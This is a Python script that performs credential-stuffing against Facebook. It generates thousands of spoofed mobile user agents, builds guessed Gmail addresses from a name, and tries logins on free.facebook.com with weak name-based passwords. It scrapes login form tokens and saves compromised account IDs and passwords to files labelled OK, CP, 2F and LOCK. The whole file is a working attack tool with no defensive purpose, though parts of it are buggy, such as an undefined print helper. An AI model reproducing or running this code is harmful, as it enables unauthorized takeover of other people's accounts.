import random, requests , re , sys , os , time
#om concurrent.futures import ThreadPoolExecutor as tpd
id = []
cp =[]
ok =[]
twf =[]
pwx=[]
loop =0
ugen  =[]
ugen2 =[]

for xd in range(10000):
    a = 'Mozilla/5.0 (Symbian/3; Series60/'
    b = random.randrange(1, 9)
    c = random.randrange(1, 9)
    d = 'Nokia'
    e = random.randrange(100, 9999)
    f = '/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/'
    g = random.randrange(1, 9)
    h = random.randrange(1, 4)
    i = random.randrange(1, 4)
    j = random.randrange(1, 4)
    k = 'Mobile Safari/535.1'
    uaku = f"{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}.{j} {k}"
    ugen2.append(uaku)
    aa = 'Mozilla/5.0 (Linux; U; Android'
    b = ['6', '7', '8', '9', '10', '11', '12']
    c = ' en-us; GT-'
    d = ['A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z']
    e = random.randrange(1, 999)
    f = ['A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z']
    g = 'AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
    h = random.randrange(73, 100)
    i = '0'
    j = random.randrange(4200, 4900)
    k = random.randrange(40, 150)
    l = 'Mobile Safari/537.36'
    uaku2 = f"{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}"
    ugen.append(uaku2)

def mail():
	first = input("First name :")
	last = input('last name : ')
	domain = "@gmail.com"
	for n in range(5000):
		_ = random.randint(111,9999)
		__ = first+last
		id.append(__+str(_)+domain)
	print("  Total Gmail Accounts : %s  "%(len(id)))
	print("  Cloning Proccess Started   ")
	for user in id:
		pwx = [first+last,first+' '+last,"khan1122"]
		crack(user,pwx)
	print(" Cloning Has Been Completed  ")

def crack(uid,pwx):
	global cp , ok , loop
	sys.stdout.write("\r╰◈➠ [%s/%s]"%(loop,len(id)));sys.stdout.flush()
	for ps in pwx:
		pro = random.choice(ugen)
		#ua = random.choice(ugen)
		#nip = random.choice(prox)
		#proxs = {'http': 'socks4://' + nip}
		session = requests.Session()
		free_fb = session.get('https://free.facebook.com').text
		log_data = {
                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
            "try_number":"0",
            "unrecognized_tries":"0",
            "email":uid,
            "pass":ps,
            "login":"Log In"}
		header_freefb = {
    'authority': 'free.facebook.com',
    'method': "GET",
    'scheme': 'https',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
    'accept-language': 'en-US,en;q=0.9',
    'cache-control': 'max-age=0',
    'referer': 'https://free.facebook.com',
    'sec-ch-ua': '"Chromium";v="105", "Not)A;Brand";v="8"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Linux"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': pro,}
		lo = session.post('https://free.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8',data=log_data,headers=header_freefb).text
		#lo = session.post('https://free.facebook.com/login/device-based/regular/login/?refsrc',data=log_data,headers=header_freefb).text
		log_cookies=session.cookies.get_dict().keys()
		if 'c_user' in log_cookies:
			coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
			cid = coki[151:166]
			p("\r \033[1;92m◈➠[OK] %s | %s \033[1;97m"%(cid,ps))
			open("/sdcard/RRY/OK.txt","a").write(cid+'|'+ps+'\n')
			ok.append(cid+ps)
			break
			continue
		elif 'checkpoint' in log_cookies:
			if 'Enter login code to continue' in log_cookies:
				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
				uid=coki[24:39]
				print('\r\033[1;34m[2F] '+uid+' [~] '+ps+' ')
				open("/sdcard/RRY/2F.txt","a").write(uid,ps)
				twf.append(uid)
			else:
				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
				cid = coki[141:156]
				#p(coki)
				p("\r \033[1;93m◈➠[CP] %s | %s \033[1;97m"%(cid,ps))
				open("/sdcard/RRY/CP.txt","a").write(cid+'|'+ps+'\n')
				cp.append(cid+ps)
				break
		elif '/x/checkpoint' in log_cookies:
			coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
			cid = coki[7:22]
			p(f"\r [LOCK] %s | %s"%(cid,ps))
			open("/sdcard/RRY/LOCK.txt",'a').write(cid+'|'+ps+'\n')
			twf.append(cid+ps)
			break
		else:
			continue
	loop+=1
		

mail()